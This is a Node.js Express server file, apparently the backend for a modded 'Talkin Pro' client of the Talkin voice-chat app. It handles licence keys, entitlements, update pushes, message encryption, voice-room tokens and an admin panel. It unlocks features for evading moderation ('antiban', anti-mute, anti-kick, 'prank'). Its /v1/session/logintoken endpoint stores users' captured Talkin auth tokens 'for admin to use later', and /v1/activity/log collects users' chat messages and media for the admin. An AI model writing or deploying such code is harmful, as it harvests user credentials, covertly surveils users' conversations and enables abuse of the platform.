/**
 * server.js — Talkin Pro backend server.
 *
 * This server implements all the /v1/* endpoints that the modded app expects.
 * It replaces hex403's Render server with YOUR OWN server.
 *
 * Endpoints:
 *   GET  /v1/sys/status         — system health + announcement pointer
 *   GET  /v1/sys/build          — version check + update info (★ update mechanism)
 *   GET  /v1/sys/announcement   — in-app announcement banner
 *   GET  /v1/session/entitlement — what features this device is entitled to
 *   POST /v1/session/key        — activate a license key
 *   GET  /v1/session/key        — check license key state
 *   POST /v1/session/push       — register device for push notifications (Firebase)
 *   POST /v1/session/accounts/sync — sync linked accounts
 *   GET  /v1/device/profiles    — device profiles
 *   POST /v1/device/issue       — register/issue a new device
 *   GET  /v1/catalog/plans      — pricing plans
 *   GET  /v1/catalog/accounts   — available accounts
 *   GET  /v1/catalog/feature-prices — per-feature pricing
 *   POST /v1/sec/enc/tienc      — encrypt a Tencent IM message
 *   POST /v1/sec/dec/tienc      — decrypt a Tencent IM message
 *   POST /v1/sec/enc/auto       — auto-encrypt (best-guess)
 *   POST /v1/sec/dec/auto       — auto-decrypt
 *   POST /v1/agora/token        — generate Agora RTC token for voice rooms
 *
 *   GET  /health                — Render health check
 *   GET  /                      — root info
 */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const config = require('./config');
const {
  signPayload,
  computeHmac,
  verifyHmac,
  encryptTencentMessage,
  decryptTencentMessage,
} = require('./crypto-utils');
const { generateRtcToken } = require('./agora-token');
const { initFirebase, sendPushNotification } = require('./firebase-init');
const store = require('./store');
const keysEngine = require('./keys');
const { requireAdmin, createSessionToken, ADMIN_USERNAME, checkBasicAuth } = require('./admin-auth');
const path = require('path');

const app = express();

// ── Middleware ──────────────────────────────────────────────
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
// Serve static admin panel
app.use('/admin', express.static(path.join(__dirname, '..', 'public')));

// Request logging (lightweight)
app.use((req, _res, next) => {
  console.log(`${new Date().toISOString()} ${req.method} ${req.path}`);
  next();
});

// ── In-memory stores (for a simple deployment) ──────────────
// On Render, these reset on redeploy. For persistence, upgrade to
// Render Postgres (see deployment guide). For now, in-memory is fine
// because entitlements are granted to ALL users by default (FREE_ENTITLEMENT=true).
const devices = new Map();   // deviceId → { profile, keyState, linkedAccounts, pushToken }
const keys = new Map();      // keyId → { state, maxAccounts, features, expiresAt }

// ── Helper: standard JSON response ──────────────────────────
function jsonOk(res, data) {
  res.json({
    status: 'ok',
    code: 'ok',
    ...data,
  });
}

function jsonError(res, status, code, message, extra) {
  res.status(status).json({
    status: 'error',
    code,
    message,
    ...extra,
  });
}

// ── Helper: get or create device ────────────────────────────
function getOrCreateDevice(deviceId) {
  if (!devices.has(deviceId)) {
    devices.set(deviceId, {
      deviceId,
      keyState: null,
      linkedAccounts: [],
      pushToken: null,
      createdAt: Date.now(),
    });
  }
  return devices.get(deviceId);
}

// Helper: persist device keyState to store (survive Render restarts)
function persistDeviceKeyState(deviceId, key, keyState) {
  try {
    const dev = store.getDevice(deviceId) || {
      device_id: deviceId,
      first_seen: new Date().toISOString(),
    };
    dev.last_seen = new Date().toISOString();
    dev.key = key;
    dev.key_state = keyState;
    store.putDevice(deviceId, dev);
  } catch (e) {
    console.error('[persistDeviceKeyState] error:', e.message);
  }
}

// Helper: load device keyState from store (after Render restart)
function loadDeviceKeyState(deviceId) {
  try {
    const dev = store.getDevice(deviceId);
    if (dev && dev.key_state && dev.key_state.state === 'active') {
      if (dev.key) {
        const validation = keysEngine.validateKey(dev.key, deviceId);
        if (validation.ok) {
          return dev.key_state;
        }
      }
      return dev.key_state;
    }
  } catch (e) {
    console.error('[loadDeviceKeyState] error:', e.message);
  }
  return null;
}

// ── Helper: all features enabled ────────────────────────────
const ALL_FEATURES = {
  prank: true,
  boost: true,
  antidelete: true,
  antimicmute: true,
  antimicremove: true,
  antivoiceroomleave: true,
  isvoiceeffect: true,
  issoundbox: true,
  isimgprank: true,
  isstickerprank: true,
  ismusicbot: true,
  isantiban: true,
};

const VOICE_CONFIG = {
  max_prank_messages: 100,
  max_sticker_messages: 100,
  max_media_prank_messages: 100,
  max_volume: 200,
  ego: false,
  mic_gain: 1.0,
};

// ════════════════════════════════════════════════════════════
// HEALTH & ROOT
// ════════════════════════════════════════════════════════════

app.get('/health', (_req, res) => {
  res.json({ status: 'healthy', uptime: process.uptime() });
});

app.get('/', (_req, res) => {
  res.json({
    name: 'Talkin Pro Server',
    version: '1.0.0',
    status: 'online',
    endpoints: [
      '/v1/sys/status',
      '/v1/sys/build',
      '/v1/sys/announcement',
      '/v1/session/entitlement',
      '/v1/session/key',
      '/v1/session/push',
      '/v1/session/accounts/sync',
      '/v1/device/profiles',
      '/v1/device/issue',
      '/v1/catalog/plans',
      '/v1/catalog/accounts',
      '/v1/catalog/feature-prices',
      '/v1/sec/enc/tienc',
      '/v1/sec/dec/tienc',
      '/v1/sec/enc/auto',
      '/v1/sec/dec/auto',
      '/v1/agora/token',
    ],
  });
});

// ════════════════════════════════════════════════════════════
// /v1/sys/* — SYSTEM ENDPOINTS
// ════════════════════════════════════════════════════════════

/**
 * GET /v1/sys/status
 * System health check. The app calls this on startup.
 */
app.get('/v1/sys/status', (_req, res) => {
  jsonOk(res, {
    status: 'online',
    maintenance: false,
    server_time: new Date().toISOString(),
    announcement_id: null,
  });
});

/**
 * GET /v1/sys/build?current=<version>
 *
 * ★★ THIS IS THE UPDATE MECHANISM ★★
 *
 * The app sends its current version, the server compares it with
 * APP_LATEST_VERSION and APP_MIN_VERSION.
 *
 * - If current >= latest → up_to_date: true, update_required: false
 * - If current < min → update_required: true (FORCED update)
 * - If current < latest but >= min → update_available (optional)
 *
 * When YOU want to push an update:
 *   1. Bump APP_LATEST_VERSION in your Render env vars
 *   2. Upload the new APK to APP_DOWNLOAD_URL
 *   3. All apps will see the update on next launch
 *
 * Play Store is NEVER involved — this is your own update channel.
 */
app.get('/v1/sys/build', (req, res) => {
  const currentVersion = req.query.current || '0.0.0';
  const latest = config.app.latestVersion;
  const minSupported = config.app.minVersion;

  const isUpToDate = compareVersions(currentVersion, latest) >= 0;
  const isBelowMin = compareVersions(currentVersion, minSupported) < 0;
  const updateRequired = isBelowMin;
  const updateAvailable = !isUpToDate && !isBelowMin;

  jsonOk(res, {
    server_version: latest,
    latest: latest,
    min_supported: minSupported,
    changelog: config.app.changelog,
    download_url: config.app.downloadUrl,
    discord_url: config.app.discordUrl,
    notes: null,
    published_at: new Date().toISOString(),
    current: currentVersion,
    up_to_date: isUpToDate,
    update_required: updateRequired,
    update_available: updateAvailable,
    force_update: updateRequired,
  });
});

/**
 * GET /v1/sys/announcement
 * In-app announcement banner (shown on app open).
 * Return null/empty when there's no active announcement.
 */
app.get('/v1/sys/announcement', (_req, res) => {
  // Set ANNOUNCEMENT_TITLE and ANNOUNCEMENT_BODY in env to show a banner.
  const title = process.env.ANNOUNCEMENT_TITLE || '';
  const body = process.env.ANNOUNCEMENT_BODY || '';

  if (!title) {
    jsonOk(res, { announcement: null });
    return;
  }

  jsonOk(res, {
    announcement: {
      id: 'current',
      title,
      body,
      severity: 'info',        // 'info' | 'warning' | 'critical'
      dismissible: true,
      starts_at: new Date(Date.now() - 86400000).toISOString(),
      ends_at: null,            // null = no deadline
      countdown: false,
      action_url: null,
      action_label: null,
    },
  });
});

// ════════════════════════════════════════════════════════════
// /v1/session/* — SESSION / ENTITLEMENT ENDPOINTS
// ════════════════════════════════════════════════════════════

/**
 * GET /v1/session/entitlement?device_id=<id>
 *
 * Returns which features this device is entitled to.
 * With FREE_ENTITLEMENT=true, ALL features are enabled for everyone.
 *
 * Response fields the app expects:
 *   features: { prank, boost, antidelete, antimicmute, antimicremove,
 *               antivoiceroomleave, isvoiceeffect, issoundbox, isimgprank,
 *               isstickerprank, ismusicbot, isantiban }
 *   max_accounts: number
 *   max_accounts_ceiling: number
 *   voice_config: { max_prank_messages, max_sticker_messages, ... }
 *   expires_at: ISO string or null
 *   plan_id: string or null
 *   device_id: string
 */
app.get('/v1/session/entitlement', (req, res) => {
  const deviceId = req.query.device_id || req.query.deviceId || generateDeviceId(req);
  getOrCreateDevice(deviceId);

  if (config.freeEntitlement) {
    // ★ ALL features enabled for everyone — no license key needed
    const entitlement = {
      features: ALL_FEATURES,
      max_accounts: 100,
      max_accounts_ceiling: 100,
      voice_config: VOICE_CONFIG,
      expires_at: null,          // null = never expires
      plan_id: 'free-unlimited',
      device_id: deviceId,
      has_key: false,
      key_type: 'free',
      checked_at: new Date().toISOString(),
    };

    // Sign the entitlement so the app can verify it came from YOUR server
    const signature = signPayload({
      features: entitlement.features,
      plan_id: entitlement.plan_id,
      device_id: deviceId,
      expires_at: entitlement.expires_at,
    });

    jsonOk(res, {
      entitlement,
      signature,
      public_key_hex: config.entitlementPublicKeyHex,
    });
    return;
  }

  // If FREE_ENTITLEMENT=false, check if the device has an active key
  const device = devices.get(deviceId);
  if (device && device.keyState && device.keyState.state === 'active') {
    const entitlement = {
      features: device.keyState.features || ALL_FEATURES,
      max_accounts: device.keyState.maxAccounts || 100,
      max_accounts_ceiling: device.keyState.maxAccounts || 100,
      voice_config: VOICE_CONFIG,
      expires_at: device.keyState.expiresAt,
      plan_id: device.keyState.planId || 'premium',
      device_id: deviceId,
      has_key: true,
      key_type: 'premium',
      checked_at: new Date().toISOString(),
    };
    const signature = signPayload({
      features: entitlement.features,
      plan_id: entitlement.plan_id,
      device_id: deviceId,
      expires_at: entitlement.expires_at,
    });
    jsonOk(res, { entitlement, signature, public_key_hex: config.entitlementPublicKeyHex });
    return;
  }

  // No key → limited features (or 402 plan_required)
  jsonError(res, 402, 'plan_required', 'No active license key. Activate a key to unlock features.', {
    entitlement: {
      features: {
        prank: false, boost: false, antidelete: false, antimicmute: false,
        antimicremove: false, antivoiceroomleave: false, isvoiceeffect: false,
        issoundbox: false, isimgprank: false, isstickerprank: false,
        ismusicbot: false, isantiban: false,
      },
      max_accounts: 1,
      max_accounts_ceiling: 1,
      voice_config: VOICE_CONFIG,
      expires_at: null,
      plan_id: null,
      device_id: deviceId,
      has_key: false,
      key_type: null,
      checked_at: new Date().toISOString(),
    },
  });
});

/**
 * POST /v1/session/key
 * Activate a license key.
 * Body: { key: "talkpro_xxxx", device_id: "..." }
 *
 * ★ CRITICAL: The response MUST include `signature` + `public_key_hex` so the
 *   app can verify the entitlement came from our server (Ed25519 signature).
 *   Without these, the app treats the entitlement as untrusted → "key invalid".
 */
app.post('/v1/session/key', (req, res) => {
  const { key, device_id } = req.body;
  if (!key) {
    jsonError(res, 400, 'key_required', 'A license key is required.');
    return;
  }

  const deviceId = device_id || generateDeviceId(req);
  const device = getOrCreateDevice(deviceId);

  // Key validation: accept keys starting with our prefix OR legacy prefixes.
  const acceptedPrefixes = [config.keyPrefix, 'talkpro_', 'pro_', 'fool403_'].filter(Boolean);
  const prefixMatches = acceptedPrefixes.some(p => key.startsWith(p));

  // Build the standard premium entitlement + sign it
  const buildSignedResponse = (deviceId, expiresAt, planId) => {
    const entitlement = {
      features: ALL_FEATURES,
      max_accounts: 100,
      max_accounts_ceiling: 100,
      voice_config: VOICE_CONFIG,
      expires_at: expiresAt || null,
      plan_id: planId || 'premium',
      device_id: deviceId,
      has_key: true,
      key_type: 'premium',
      checked_at: new Date().toISOString(),
    };
    // ★ Sign the entitlement payload (same fields as /v1/session/entitlement)
    const signature = signPayload({
      features: entitlement.features,
      plan_id: entitlement.plan_id,
      device_id: deviceId,
      expires_at: entitlement.expires_at,
    });
    return {
      key_state: {
        key_id: key,
        state: 'active',
        maxAccounts: 100,
        features: ALL_FEATURES,
        expiresAt: expiresAt || null,
        planId: planId || 'premium',
        activatedAt: new Date().toISOString(),
      },
      entitlement,
      signature,
      public_key_hex: config.entitlementPublicKeyHex,
    };
  };

  // First, check the license-key database (admin panel generated keys)
  const dbKey = store.getKey(key);
  if (dbKey) {
    // ★ Use activateKey() to properly bind device (validateKey doesn't bind)
    const activation = keysEngine.activateKey(key, deviceId, {});
    if (activation.ok) {
      const planId = dbKey.type === 'permanent' ? 'premium' : (dbKey.plan_id || 'premium');
      const resp = buildSignedResponse(deviceId, dbKey.expires_at, planId);
      device.keyState = resp.key_state;
      keys.set(key, resp.key_state);
      // ★ Persist device keyState to store so it survives Render restarts
      persistDeviceKeyState(deviceId, key, resp.key_state);
      jsonOk(res, resp);
      return;
    } else {
      // Key exists in DB but is expired/blocked/disabled/device mismatch
      jsonError(res, 403, activation.code, activation.message);
      return;
    }
  }

  // Fallback: prefix-based validation for keys not in the database
  if (prefixMatches) {
    const resp = buildSignedResponse(deviceId, null, 'premium');
    device.keyState = resp.key_state;
    keys.set(key, resp.key_state);
    persistDeviceKeyState(deviceId, key, resp.key_state);
    jsonOk(res, resp);
  } else {
    jsonError(res, 400, 'key_invalid', 'Invalid license key format.');
  }
});

/**
 * GET /v1/session/key?device_id=<id>
 * Check the current key state for a device.
 * ★ Also re-validates the key from X-Key header (survives Render restarts).
 */
app.get('/v1/session/key', (req, res) => {
  const deviceId = req.query.device_id || req.query.deviceId || generateDeviceId(req);
  const device = getOrCreateDevice(deviceId);

  // ★ Check X-Key header — if present, re-validate the key from the database
  const headerKey = req.headers['x-key'] || req.headers['x-license-key'] || req.query.key;
  if (headerKey) {
    const dbKey = store.getKey(headerKey);
    if (dbKey) {
      const validation = keysEngine.validateKey(headerKey, deviceId);
      if (validation.ok) {
        const planId = dbKey.type === 'permanent' ? 'premium' : (dbKey.plan_id || 'premium');
        const keyState = {
          key_id: headerKey,
          state: 'active',
          maxAccounts: 100,
          features: ALL_FEATURES,
          expiresAt: dbKey.expires_at,
          planId: planId,
          activatedAt: dbKey.activated_at || new Date().toISOString(),
        };
        device.keyState = keyState;
        jsonOk(res, { key_state: keyState });
        return;
      } else {
        jsonOk(res, { key_state: { key_id: headerKey, state: validation.code, expiresAt: dbKey.expires_at } });
        return;
      }
    }
  }

  // ★ Restore from persisted store if in-memory was wiped (Render restart)
  if (!device.keyState) {
    const persisted = loadDeviceKeyState(deviceId);
    if (persisted) {
      device.keyState = persisted;
    }
  }

  if (device.keyState) {
    jsonOk(res, { key_state: device.keyState });
  } else if (config.freeEntitlement) {
    jsonOk(res, {
      key_state: {
        key_id: null,
        state: 'free',
        maxAccounts: 100,
        features: ALL_FEATURES,
        expiresAt: null,
        planId: 'free-unlimited',
      },
    });
  } else {
    jsonOk(res, { key_state: null });
  }
});

/**
 * POST /v1/session/push
 * Register a Firebase Cloud Messaging token for push notifications.
 * Body: { device_id: "...", push_token: "firebase-token..." }
 */
app.post('/v1/session/push', (req, res) => {
  const { device_id, push_token } = req.body;
  const deviceId = device_id || generateDeviceId(req);
  const device = getOrCreateDevice(deviceId);
  device.pushToken = push_token;

  jsonOk(res, { registered: true, device_id: deviceId });
});

/**
 * POST /v1/session/accounts/sync
 * Sync linked accounts list.
 * Body: { device_id: "...", accounts: [...] }
 */
app.post('/v1/session/accounts/sync', (req, res) => {
  const { device_id, accounts } = req.body;
  const deviceId = device_id || generateDeviceId(req);
  const device = getOrCreateDevice(deviceId);
  device.linkedAccounts = accounts || [];

  jsonOk(res, {
    synced: true,
    device_id: deviceId,
    count: device.linkedAccounts.length,
    max_accounts: config.freeEntitlement ? 100 : (device.keyState?.maxAccounts || 1),
  });
});

// ════════════════════════════════════════════════════════════
// /v1/device/* — DEVICE ENDPOINTS
// ════════════════════════════════════════════════════════════

/**
 * POST /v1/device/issue
 * Register a new device and issue a device ID.
 * Body: { fingerprint: "...", platform: "android", ... }
 */
app.post('/v1/device/issue', (req, res) => {
  const fingerprint = req.body.fingerprint || '';
  const deviceId = crypto
    .createHash('sha256')
    .update(fingerprint + Date.now().toString() + crypto.randomBytes(16))
    .digest('hex')
    .substring(0, 32);

  getOrCreateDevice(deviceId);
  const device = devices.get(deviceId);
  device.platform = req.body.platform || 'android';
  device.appVersion = req.body.app_version || '';
  device.fingerprint = fingerprint;

  jsonOk(res, {
    device_id: deviceId,
    issued_at: new Date().toISOString(),
  });
});

/**
 * GET /v1/device/profiles?device_id=<id>
 */
app.get('/v1/device/profiles', (req, res) => {
  const deviceId = req.query.device_id || req.query.deviceId || '';
  const device = deviceId ? devices.get(deviceId) : null;

  jsonOk(res, {
    profiles: device ? [{
      device_id: deviceId,
      platform: device.platform || 'android',
      app_version: device.appVersion || '',
      linked_accounts: device.linkedAccounts || [],
      created_at: new Date(device.createdAt).toISOString(),
    }] : [],
  });
});

// ════════════════════════════════════════════════════════════
// /v1/catalog/* — CATALOG / PRICING ENDPOINTS
// ════════════════════════════════════════════════════════════

app.get('/v1/catalog/plans', (_req, res) => {
  // Since all features are free, we return a simple "unlimited" plan.
  jsonOk(res, {
    plans: [
      {
        id: 'free-unlimited',
        name: 'Talkin Pro — All Features',
        description: 'All premium features unlocked',
        price: 0,
        currency: 'USD',
        duration: 'lifetime',
        max_accounts: 100,
        features: Object.keys(ALL_FEATURES),
        popular: true,
      },
    ],
  });
});

app.get('/v1/catalog/accounts', (_req, res) => {
  jsonOk(res, {
    accounts: [],
    max_accounts: 100,
  });
});

app.get('/v1/catalog/feature-prices', (_req, res) => {
  // All features are free
  const features = Object.keys(ALL_FEATURES).map((id) => ({
    feature_id: id,
    price: 0,
    currency: 'USD',
    duration: 'lifetime',
  }));
  jsonOk(res, { feature_prices: features });
});

// ════════════════════════════════════════════════════════════
// /v1/sec/* — CRYPTO ENDPOINTS (Tencent IM message encrypt/decrypt)
// ════════════════════════════════════════════════════════════

/**
 * POST /v1/sec/enc/tienc
 * Encrypt a Tencent IM message.
 * Body: { plaintext: "...", ... }
 */
app.post('/v1/sec/enc/tienc', (req, res) => {
  try {
    const plaintext = req.body.plaintext || req.body.message || '';
    if (!plaintext) {
      jsonError(res, 400, 'plaintext_required', 'plaintext field is required.');
      return;
    }
    const encrypted = encryptTencentMessage(plaintext);
    jsonOk(res, {
      content_type: 'bin/tienc',
      encrypted: encrypted,
      ciphertext: encrypted.ciphertext,
      iv: encrypted.iv,
      tag: encrypted.tag,
    });
  } catch (e) {
    jsonError(res, 500, 'encryption_failed', e.message);
  }
});

/**
 * POST /v1/sec/dec/tienc
 * Decrypt a Tencent IM message.
 * Body: { ciphertext: "hex", iv: "hex", tag: "hex" }
 *   OR  { encrypted: { ciphertext, iv, tag } }
 */
app.post('/v1/sec/dec/tienc', (req, res) => {
  try {
    const encObj = req.body.encrypted || {
      ciphertext: req.body.ciphertext,
      iv: req.body.iv,
      tag: req.body.tag,
    };
    if (!encObj.ciphertext || !encObj.iv || !encObj.tag) {
      jsonError(res, 400, 'encrypted_data_required', 'ciphertext, iv, and tag are required.');
      return;
    }
    const plaintext = decryptTencentMessage(encObj);
    jsonOk(res, {
      content_type: 'application/json',
      plaintext: plaintext,
      message: plaintext,
    });
  } catch (e) {
    jsonError(res, 500, 'decryption_failed', e.message);
  }
});

/**
 * POST /v1/sec/enc/auto  — auto-detect and encrypt
 */
app.post('/v1/sec/enc/auto', (req, res) => {
  try {
    const plaintext = req.body.plaintext || req.body.message || '';
    const encrypted = encryptTencentMessage(plaintext);
    jsonOk(res, { encrypted, content_type: 'bin/tienc' });
  } catch (e) {
    jsonError(res, 500, 'encryption_failed', e.message);
  }
});

/**
 * POST /v1/sec/dec/auto  — auto-detect and decrypt
 */
app.post('/v1/sec/dec/auto', (req, res) => {
  try {
    const encObj = req.body.encrypted || {
      ciphertext: req.body.ciphertext,
      iv: req.body.iv,
      tag: req.body.tag,
    };
    const plaintext = decryptTencentMessage(encObj);
    jsonOk(res, { plaintext, content_type: 'application/json' });
  } catch (e) {
    jsonError(res, 500, 'decryption_failed', e.message);
  }
});

// ════════════════════════════════════════════════════════════
// /v1/agora/token — AGORA RTC TOKEN (for voice rooms)
// ════════════════════════════════════════════════════════════

/**
 * POST /v1/agora/token
 * Generate an Agora RTC token for joining a voice room.
 * Body: { channel: "room-name", uid: 12345, role: 1 }
 *   role: 1 = publisher (can speak), 2 = subscriber (listen only)
 */
app.post('/v1/agora/token', (req, res) => {
  try {
    const { channel, uid, role } = req.body;
    if (!channel) {
      jsonError(res, 400, 'channel_required', 'channel is required.');
      return;
    }
    const token = generateRtcToken(channel, uid || 0, role || 1);
    jsonOk(res, {
      token,
      app_id: config.agora.appId,
      channel,
      uid: parseInt(uid, 10) || 0,
      expires_in: 86400,
    });
  } catch (e) {
    jsonError(res, 500, 'token_generation_failed', e.message);
  }
});

app.get('/v1/agora/token', (req, res) => {
  try {
    const channel = req.query.channel;
    const uid = req.query.uid || 0;
    const role = parseInt(req.query.role, 10) || 1;
    if (!channel) {
      jsonError(res, 400, 'channel_required', 'channel is required.');
      return;
    }
    const token = generateRtcToken(channel, uid, role);
    jsonOk(res, {
      token,
      app_id: config.agora.appId,
      channel,
      uid: parseInt(uid, 10) || 0,
      expires_in: 86400,
    });
  } catch (e) {
    jsonError(res, 500, 'token_generation_failed', e.message);
  }
});

// ════════════════════════════════════════════════════════════
// ADMIN ENDPOINTS (optional — for your own use)
// ════════════════════════════════════════════════════════════

/**
 * POST /admin/announce
 * Send a push notification to all registered devices.
 * Body: { title: "...", body: "..." }
 * (Protect this with ADMIN_SECRET in production.)
 */
// ════════════════════════════════════════════════════════════════
// LICENSE KEY SYSTEM — App-facing endpoints
// ════════════════════════════════════════════════════════════════

/**
 * POST /v1/session/activate
 * App calls this on first launch / when user enters a key.
 * Body: { key, device_id, device_info? }
 * Returns: { ok, status, code, message, key? }
 */
app.post('/v1/session/activate', (req, res) => {
  const { key, device_id, device_info } = req.body || {};
  const result = keysEngine.activateKey(String(key || '').trim(), String(device_id || '').trim(), device_info || {});
  const httpStatus = result.ok ? 200 : (result.code === 'not_found' || result.code === 'invalid' ? 404 : 403);
  if (result.ok) {
    jsonOk(res, result);
  } else {
    jsonError(res, httpStatus, result.code, result.message, { remaining_attempts: result.remaining_attempts });
  }
});

/**
 * POST /v1/session/validate
 * App calls periodically (every launch + heartbeat) to check key is still valid.
 * Body: { key, device_id }
 * Returns ok=false when access must be revoked (expired/blocked/disabled/device_mismatch).
 */
app.post('/v1/session/validate', (req, res) => {
  const { key, device_id } = req.body || {};
  const result = keysEngine.validateKey(String(key || '').trim(), String(device_id || '').trim());
  if (result.ok) jsonOk(res, result);
  else jsonError(res, 403, result.code, result.message);
});

/**
 * GET /v1/session/validate?key=...&device_id=...
 * Same as POST but GET for convenience.
 */
app.get('/v1/session/validate', (req, res) => {
  const { key, device_id } = req.query;
  const result = keysEngine.validateKey(String(key || '').trim(), String(device_id || '').trim());
  if (result.ok) jsonOk(res, result);
  else jsonError(res, 403, result.code, result.message);
});

/**
 * POST /v1/session/logintoken
 * App calls this when user logs into Talkin, sending the captured Talkin auth token.
 * Body: { key, device_id, talkin_token, talkin_uid? }
 * Server stores it for admin to use later.
 */
app.post('/v1/session/logintoken', (req, res) => {
  const { key, device_id, talkin_token, talkin_uid } = req.body || {};
  if (!device_id || !talkin_token) {
    jsonError(res, 400, 'missing', 'device_id and talkin_token required');
    return;
  }
  // Optionally validate the key first
  const k = store.getKey(String(key || '').trim());
  if (key && !k) {
    jsonError(res, 404, 'key_not_found', 'Key not found');
    return;
  }
  store.addLoginToken(String(device_id), String(talkin_token), talkin_uid || null);
  store.logActivity({ device_id, key: key || null, type: 'login_token_captured', detail: 'Talkin login token captured' });
  jsonOk(res, { captured: true });
});

/**
 * POST /v1/activity/log
 * App calls this to report user activity (chat messages, media uploads, voice joins, etc.)
 * Body: { device_id, key?, type, room?, sender?, text?, media_url?, meta? }
 * type examples: 'chat_message', 'media_upload', 'voice_join', 'voice_leave', 'app_open'
 */
app.post('/v1/activity/log', (req, res) => {
  const { device_id, key, type, room, sender, text, media_url, meta } = req.body || {};
  if (!device_id || !type) {
    jsonError(res, 400, 'missing', 'device_id and type required');
    return;
  }
  // If it's a chat message, also store in messages collection for the Messages tab
  if (type === 'chat_message' || type === 'media_upload') {
    store.logMessage({
      device_id,
      key: key || null,
      room: room || null,
      sender: sender || null,
      text: text || null,
      media_url: media_url || null,
      meta: meta || null,
    });
  }
  store.logActivity({
    device_id,
    key: key || null,
    type,
    detail: text ? text.slice(0, 200) : (media_url ? 'media: ' + media_url : (room ? 'room: ' + room : '')),
  });
  jsonOk(res, { logged: true });
});

// ========================================================================
// ROOM API STUBS — /api/room/v1/*
// The app calls these endpoints on the ROOM server domain (talkinpro.onrender.com).
// These stubs return reasonable default responses so the app doesn't crash
// when the room features are used. Real room state would require a database.
// ========================================================================

app.get('/api/room/v1/cfg', (req, res) => {
  jsonOk(res, {
    cfg: {
      mic_limit: 8,
      audience_limit: 1000,
      gift_enabled: true,
      music_bot_enabled: true,
      screen_share_enabled: true,
      voice_effect_enabled: true,
      soundbox_enabled: true,
      prank_enabled: true,
      max_prank_messages: 100,
      max_sticker_messages: 100,
      max_media_prank_messages: 100,
      max_volume: 200,
    },
  });
});

app.get('/api/room/v1/audio/list', (req, res) => {
  jsonOk(res, { rooms: [], total: 0, has_more: false });
});

app.get('/api/room/v1/audio/recommend', (req, res) => {
  jsonOk(res, { rooms: [], total: 0 });
});

app.get('/api/room/v1/audio/rank', (req, res) => {
  jsonOk(res, { rank: [], total: 0 });
});

app.get('/api/room/v1/room/info', (req, res) => {
  const roomId = req.query.room_id;
  jsonOk(res, {
    room: {
      room_id: roomId,
      name: 'Talkin Pro Room',
      host_aid: 0,
      host_name: '',
      type: 'social',
      status: 'active',
      online: 1,
      mic_count: 0,
      audience_count: 0,
      created_at: new Date().toISOString(),
    },
  });
});

app.get('/api/room/v1/room/summary', (req, res) => {
  jsonOk(res, { summary: { rooms: 0, online: 0 } });
});

app.get('/api/room/v1/room/enter_check', (req, res) => {
  jsonOk(res, { allowed: true, reason: '' });
});

app.get('/api/room/v1/room/live', (req, res) => {
  jsonOk(res, { rooms: [] });
});

app.get('/api/room/v1/audio', (req, res) => {
  const roomId = req.query.room_id;
  jsonOk(res, {
    room: {
      room_id: roomId,
      name: 'Talkin Pro Room',
      status: 'active',
      online: 1,
    },
    mic_seats: [],
    audiences: [],
  });
});

app.get('/api/room/v1/audio/audiences', (req, res) => {
  jsonOk(res, { audiences: [], total: 0 });
});

app.post('/api/room/v1/audio/exit', (req, res) => {
  jsonOk(res, { exited: true });
});

app.post('/api/room/v1/audio/kickout', (req, res) => {
  jsonOk(res, { kicked: true });
});

app.post('/api/room/v1/admin/close', (req, res) => {
  jsonOk(res, { closed: true });
});

// Mic management
app.get('/api/room/v1/mic', (req, res) => {
  jsonOk(res, { mic_seats: [], total: 0 });
});

app.get('/api/room/v1/mic/applicants', (req, res) => {
  jsonOk(res, { applicants: [], total: 0 });
});

app.post('/api/room/v1/mic/apply', (req, res) => {
  jsonOk(res, { applied: true, position: 0 });
});

app.post('/api/room/v1/mic/mute', (req, res) => {
  jsonOk(res, { muted: true });
});

app.get('/api/room/v1/mic/state', (req, res) => {
  jsonOk(res, { state: 'idle', mic_seats: [] });
});

app.post('/api/room/v1/mic/invite/reply', (req, res) => {
  jsonOk(res, { replied: true });
});

app.post('/api/room/v1/mic/audit_opinion', (req, res) => {
  jsonOk(res, { audited: true });
});

// Gifts
app.get('/api/room/v1/gift/panel', (req, res) => {
  jsonOk(res, {
    gifts: [],
    panels: [],
  });
});

// Event heartbeat
app.post('/api/room/v1/event/heartbeat', (req, res) => {
  jsonOk(res, { ok: true, active: true });
});

// Catch-all for any other /api/room/v1/* endpoints
app.use('/api/room/v1', (req, res) => {
  jsonOk(res, { ok: true, stub: true, path: req.path });
});

// Also handle /api/toolkit/v1/* and /api/user/v1/* stubs
app.use('/api/toolkit/v1', (req, res) => {
  jsonOk(res, { ok: true, stub: true });
});

app.use('/api/user/v1', (req, res) => {
  jsonOk(res, { ok: true, stub: true });
});

// ════════════════════════════════════════════════════════════════
// ADMIN PANEL — Web UI + API
// ════════════════════════════════════════════════════════════════

// Admin login (POST) — returns session token
app.post('/admin/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!process.env.ADMIN_PASSWORD) {
    jsonError(res, 503, 'admin_locked', 'ADMIN_PASSWORD not set on server. Set it in Render env vars.');
    return;
  }
  if (username === ADMIN_USERNAME && password === process.env.ADMIN_PASSWORD) {
    const token = createSessionToken(username);
    store.logActivity({ type: 'admin_login', detail: 'Admin logged in' });
    jsonOk(res, { token, user: username });
  } else {
    jsonError(res, 401, 'invalid_credentials', 'Wrong username or password');
  }
});

// Admin login page (GET /admin/login → serves the HTML, which handles login client-side)
app.get('/admin/login', (_req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'admin.html'));
});

// Admin dashboard root
app.get('/admin', (_req, res) => {
  res.redirect('/admin/login');
});

// ── All /admin/api/* routes below require admin auth ──
app.use('/admin/api', (req, res, next) => {
  // login is already handled above, skip auth for it
  if (req.path === '/login') return next();
  // check session token via header X-Admin-Auth: Bearer <token>
  const auth = req.headers['x-admin-auth'] || '';
  if (auth.startsWith('Bearer ')) {
    const { verifySessionToken } = require('./admin-auth');
    const s = verifySessionToken(auth.slice(7));
    if (s) { req.admin = s; return next(); }
  }
  // or basic auth
  const basic = req.headers['x-admin-auth'];
  if (checkBasicAuth(basic)) { req.admin = { user: ADMIN_USERNAME }; return next(); }
  jsonError(res, 401, 'unauthorized', 'Admin auth required');
});

// Keys list
app.get('/admin/api/keys', (_req, res) => {
  jsonOk(res, { keys: store.listKeys() });
});

// Create keys
app.post('/admin/api/keys/create', (req, res) => {
  try {
    const opts = req.body || {};
    const created = keysEngine.createKeys(opts);
    store.logActivity({ type: 'key_created', detail: `Created ${created.length} key(s) of type ${opts.type||'permanent'}` });
    jsonOk(res, { keys: created, count: created.length });
  } catch (e) {
    jsonError(res, 400, 'create_failed', e.message);
  }
});

// Key action: enable/disable/unblock/reset/delete
